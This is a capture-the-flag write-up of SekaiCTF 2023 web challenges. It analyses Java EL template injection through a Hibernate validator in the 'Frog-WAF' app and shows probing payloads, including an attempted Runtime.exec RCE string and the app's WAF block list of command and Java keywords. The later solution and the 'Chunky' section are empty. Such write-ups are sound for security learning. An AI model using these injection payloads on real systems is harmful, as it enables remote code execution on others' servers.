# SEKAI CTF 2023 - Web Writeups - Frog-WAF and Chunky

![](https://i.imgur.com/TTWINkD.png)

SekaiCTF is a Capture The Flag event hosted by [Team Project Sekai](https://sekai.team/), with some hardcore members of CTF Community.

Web challenges were fun. Worked in 3, solved 2.

## Challenge: Frog-WAF (29 solves)

![](https://i.imgur.com/oTykjrT.png)

That was a hell of a teamwork with [Regne](https://twitter.com/_regne), [Rafael](https://twitter.com/musebreakz), [Natã](https://twitter.com/EstanislauNata) and [Alisson](https://twitter.com/InfektionCTF).

### First-Look

![](https://i.imgur.com/bKCbPah.png)

In this challenge, you are presented with a Contact List. After adding, it shows the contacts on the top of the page.

![](https://i.imgur.com/5ZHJEUP.png)

Looks like some typical XSS challenge, but there is no bot involved, so it's something else.

We can use the [source-code of the challenge](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/tree/main/web-frog-waf/source) to run locally.

```
$ ./build-docker.sh 
Sending build context to Docker daemon  949.2kB
Step 1/12 : FROM gradle:7.5-jdk11-alpine AS build
 ---> 90b77c8e5ac0
Step 2/12 : COPY --chown=gradle:gradle build.gradle settings.gradle /home/gradle/frogwaf/

... BUNCH OF LINES

Successfully built a688b08fada6
Successfully tagged sekai_web_waffrog:latest
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/////////@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@////////*************@@@@@@@@@@@////////*************(@@@@@@@@
@@@@@@@@@@@@@@@/////*****************************/////********************@@@@@@
@@@@@@@@@@@@@////*///%%%(//////#%#/****************************////%%///*,%%@@@@
@@@@@@@@@@@@////%%////,,,,,,.....,,,%***********************///%//,,,,...,,,%@@@
@@@@@@@@@@@///#%///,,,,,,,,%&/,,,,.,,#********************///%//,,,,,,&&/ &&*%@@
@@@@@@@@@@///%%///,,,,&&&&&&%  &&&,,,,%******************///%//,,,,&&&&&&&&&&%@@
@@@@@@@@/////%///*,,&&&&&&&&&&&&&&&,,,%*****************///%//*,,,&&&&&&&&&&&%@@
@@@@@@@/////(%////,,,&&&&&&&&&&&&(,,,,%*****************///%///,,,,,,&&&&&,,%%@@
@@@@@@///////%%////,,,,,,,,,,,,,,,,,,%****************..*//%%///,,,,,,,,,,(%&@@@
@@@@//////////%%%////,,,,,,,,,,,,,,%/*****************,..*//%%/////,,,,/%%//@@@@
@@@//////////////%%%%/////////(%%#/********************...**//#%%%%%%%%//**/*@@@
@@/////*********///////////////**************************....***************//@@
@@/////*************************************(/********(((****,.*************//(@
@@/////**.(*******************************.(((********.((.****************//(,@@
@@/////*,.((/*****************************..*************,*************//((,..@@
@@@////***(*,,,((//*************************************************//((,,...@@@
@@@@////**,,,...,,,,(((////**************************,....****///(((,,,....%@@@@
@@@@@@///**,,,......,,,,,,,(((((/////////**********////////(((*,,,,.......@@@@@@
@@@@@@@///*,,,,...........,,,,,,,,,,,,,/((((((((((((,,,,,...,,...........@@@@@@@
@@@@@@@@@///,,,,....................,,,,,,,,,,,,,,,,,,.................@@@@@@@@@
@@@@@@@@@@@//,,,,,..................................................,@@@@@@@@@@@
@@@@@@@@@@@@@#/,,,,,..............................................,%@@@@@@@@@@@@
@@@@@@@@@@@@@@@@/,,,,,,........................................,,@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@%,,,,,,,.................................,,,(@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@,,,,,,,,,.......................,,,,,%@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,,,,,,,,,,,,,,,,,,,,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
2023-09-03 15:41:10.974  INFO 1 --- [           main] com.sekai.app.Application                : Starting Application on 5ee0fb50de34 with PID 1 (/opt/frogwaf/frogwaf-0.0.1-SNAPSHOT.jar started by app in /)
... ANOTHER BUNCH OF LINES
2023-09-03 15:48:53.574  INFO 1 --- [nio-1337-exec-1] o.s.web.servlet.DispatcherServlet        : Completed initialization in 18 ms
```

Now, the app is available on http://localhost:1337.

(Judging by the last CTFs I played, hackers are relly addicted to frogs).

### Code Analysis - Dockerfile

First place to look here is the [Dockerfile](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-frog-waf/source/Dockerfile).

```Dockerfile
FROM gradle:7.5-jdk11-alpine AS build

COPY --chown=gradle:gradle build.gradle settings.gradle /home/gradle/frogwaf/
COPY --chown=gradle:gradle src/ /home/gradle/frogwaf/src/
WORKDIR /home/gradle/frogwaf
RUN gradle bootJar

FROM openjdk:11-slim

COPY flag.txt /flag.txt

RUN mv /flag.txt /flag-$(head -n 1000 /dev/random | md5sum | head -c 32).txt

RUN addgroup --system --gid 1000 app && adduser --system --group --uid 1000 app
COPY --chown=app:app --from=build /home/gradle/frogwaf/build/libs/*.jar /opt/frogwaf/
USER app
ENTRYPOINT ["java", "-jar", "/opt/frogwaf/frogwaf-0.0.1-SNAPSHOT.jar"]
```

**Dockerfile Summary**

* Java 11 WebApp
* Flag is in the root directory
* Flag has a random filename suffix
* We must be able to list files in the root dir
* We must be able to read files on the root dir
* Usually, this is an RCE challenge

In my local container:

```
$ docker exec -it sekai_web_waffrog bash -c "ls -l flag*"
-rw-rw-r-- 1 root root 17 Aug 16 16:09 flag-453b00d5b87528dc7324eb2e93c709b5.txt
```

The name is generated at build-time, so it's different on the actual challenge server.

### Code Analysis - Controller

There is a lot of files, so I won't go into details in everyone. Let's see some important files:

**[Contact.java](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-frog-waf/source/src/main/java/com/sekai/app/controller/contact/Contact.java)**
```java
// ... Java verbosities

@Getter
@Setter
@Entity
public class Contact {

    @Id
    @GeneratedValue
    private Long id;

    @NotNull
    @Pattern(regexp = "^[A-Z][a-z]{2,}$")
    private String firstName;

    @NotNull
    @Pattern(regexp = "^[A-Z][a-z]{2,}$")
    private String lastName;

    @NotNull
    @Pattern(regexp = "^[A-Z][a-z]{2,}$")
    private String description;

    @NotNull
    @CheckCountry
    private String country;

}
```

**Contact Summary**
* Restrictive Regex validation for most data fields.
* Custom validation for Country field.

**[CheckCountry.java](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-frog-waf/source/src/main/java/com/sekai/app/controller/contact/CheckCountry.java)**
```java
// ... Java verbosities

@Target({FIELD, METHOD, PARAMETER, ANNOTATION_TYPE, TYPE_USE})
@Retention(RUNTIME)
@Constraint(validatedBy = CountryValidator.class)
@Documented
@Repeatable(CheckCountry.List.class)
public @interface CheckCountry {

    String message() default "Invalid country";

    Class<?>[] groups() default {};

    Class<? extends Payload>[] payload() default {};

    @Target({FIELD, METHOD, PARAMETER, ANNOTATION_TYPE})
    @Retention(RUNTIME)
    @Documented
    @interface List {
        CheckCountry[] value();
    }
}
```

**CheckCountry Summary**

A lot of things, but the important is the line below:

```java
@Constraint(validatedBy = CountryValidator.class)
```

Which takes us to the last piece of important code for now.

**[CountryValidator.java](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-frog-waf/source/src/main/java/com/sekai/app/controller/contact/CountryValidator.java)**
```java
// ... Java verbosities

public class CountryValidator implements ConstraintValidator<CheckCountry, String> {

    @SneakyThrows
    @Override
    public boolean isValid(final String input, final ConstraintValidatorContext constraintContext) {
        if (input == null) {
            return true;
        }

        val v = FrogWaf.getViolationByString(input);
        if (v.isPresent()) {
            val msg = String.format("Malicious input found: %s", v);
            throw new AccessDeniedException(msg);
        }

        val countries = StreamUtils.copyToString(new ClassPathResource("countries").getInputStream(), Charset.defaultCharset()).split("\n");
        val isValid = Arrays.asList(countries).contains(input);

        if (!isValid) {
            val message = String.format("%s is not a valid country", input);
            constraintContext.disableDefaultConstraintViolation();
            constraintContext.buildConstraintViolationWithTemplate(message)
                    .addConstraintViolation();
        }
        return isValid;
    }
}
```

**CountryValidator Summary**
* We get our WAF validation (we will check it later).
* We took a lot of time to find the first attack point, but [Regne](https://twitter.com/_regne) found it.

The vulnerable code is the line below:

```java
constraintContext.buildConstraintViolationWithTemplate(message).addConstraintViolation();
```
The [buildConstraintViolationWithTemplate](https://docs.jboss.org/hibernate/stable/validator/api/org/hibernate/validator/constraintvalidation/HibernateConstraintValidatorContext.html#buildConstraintViolationWithTemplate(java.lang.String)) method processes Java EL. Since we can control part of the message variable, it is basically a [Template Injection](https://codeql.github.com/codeql-query-help/java/java-insecure-bean-validation/) for us.

### Payload - The Basics

To make it simpler, let's make some valid Payloads, except for the Country, which is our attack surface.

I don't remember how we got that `message` was a variable interpreted in the EL.
Let's test some payloads on `/addContact` route.

- Payload
```json
{
    "firstName":"Hey",
    "lastName":"You",
    "description":"Abc",
    "country":"{message}"
}
```

- Response:
```json
{
    "violations": [
        {
            "fieldName": "country",
            "message": "Invalid country is not a valid country"
        }
    ]
}
```

`Invalid country` is the default return value of the [`message`](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/42289630c7c3e803c40675e8463dbd17baed6e23/web-frog-waf/source/src/main/java/com/sekai/app/controller/contact/CheckCountry.java#L21) method on the [CheckCountry.java](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-frog-waf/source/src/main/java/com/sekai/app/controller/contact/CheckCountry.java) interface.

By using the dollar sign, we start to play better games using our `message` variable.

- Payload
```json
{
    "firstName":"Hey",
    "lastName":"You",
    "description":"Abc",
    "country":"${message.getClass().toString()}"
}
```

- Response:
```json
{
    "violations": [
        {
            "fieldName": "country",
            "message": "class java.lang.String is not a valid country"
        }
    ]
}
```

Nice. So, let's just use [EL to get RCE](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/el-expression-language#rce) using the Runtime class, right?
**W**ait **A** **F**reaking minute...

### Code Analysis - WAF

![](https://i.imgur.com/dW0aESI.png)

Now is the time we arrive on the challenge name, which is the [WAF](https://www.cloudflare.com/learning/ddos/glossary/web-application-firewall-waf/).
Let's take a look at the WAF request Interceptor.

[FrogWaf.java](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-frog-waf/source/src/main/java/com/sekai/app/waf/FrogWaf.java)
```java
// ... Java verbosities

@Configuration
@Order(Integer.MIN_VALUE)
public class FrogWaf implements HandlerInterceptor {
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object obj) throws Exception {
        // Uri
        val query = request.getQueryString();
        if (query != null) {
            val v = getViolationByString(query);
            if (v.isPresent()) {
                throw new AccessDeniedException(String.format("Malicious input found: %s", v));
            }
        }
        return true;
    }

    public static Optional<WafViolation> getViolationByString(String userInput) {
        for (val c : AttackTypes.values()) {
            for (val m : c.getAttackStrings()) {
                if (userInput.contains(m)) {
                    return Optional.of(new WafViolation(c, m));
                }
            }
        }
        return Optional.empty();
    }

}
```

**WAF Summary**

The [`getViolationByString`](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-frog-waf/source/src/main/java/com/sekai/app/waf/FrogWaf.java#L29) function checks if a string contains a violation of the WAF.
It is used when validating the Country.
The `preHandle` function checks the queryString, but it is useless for solving the challenge.

Let's check the WAF rules.

[FrogWaf.java](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-frog-waf/source/src/main/java/com/sekai/app/waf/AttackTypes.java)
```java
// ... Java verbosities

public enum AttackTypes {
    SQLI("\"", "'", "#"),
    XSS(">", "<"),
    OS_INJECTION("bash", "&", "|", ";", "`", "~", "*"),
    CODE_INJECTION("for", "while", "goto", "if"),
    JAVA_INJECTION("Runtime", "class", "java", "Name", "char", "Process", "cmd", "eval", "Char", "true", "false"),
    IDK("+", "-", "/", "*", "%", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9");

    @Getter
    private final String[] attackStrings;

    AttackTypes(String... attackStrings) {
        this.attackStrings = attackStrings;
    }

}ally
```

**WAF Filters Summary**

OK, now we got a really restrictive filter for a lot of kinds of attacks.
Let's check our previous payload using some of the forbidden keywords.

- **Payload**

`${".getClass().forName("java.lang.Runtime").getRuntime().exec("curl http://127.0.0.1:8000")}`

- **Response**

`Malicious input found: Optional[WafViolation(attackType=SQLI, attackString=&quot;)]`

Let's make it a little simpler:

- **Payload**

`${java.lang.Runtime}`

- **Response**

`Optional[WafViolation(attackType=JAVA_INJECTION, attackString=Runtime)]`

Some words shall not be spoken.

![](https://i.imgur.com/u6Y7CnU.png)

### Hacking bit by bit



## Challenge: Chunky (16 solves)

![](https://i.imgur.com/yWbxMYQ.png)

## References
* Team: [FireShell](https://fireshellsecurity.team/)
* [Team Twitter](https://twitter.com/fireshellst)
* Follow me too :) [@NeptunianHacks](https://twitter.com/NeptunianHacks)
* [Hacktricks - RCE with Expression Language](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/el-expression-language#rce)
* [WAF](https://www.cloudflare.com/learning/ddos/glossary/web-application-firewall-waf/)
* [Repo with artifacts discussed here](https://github.com/Neptunians/sekai-ctf-2023-web-writeup)
* [Team Project Sekai](https://sekai.team/)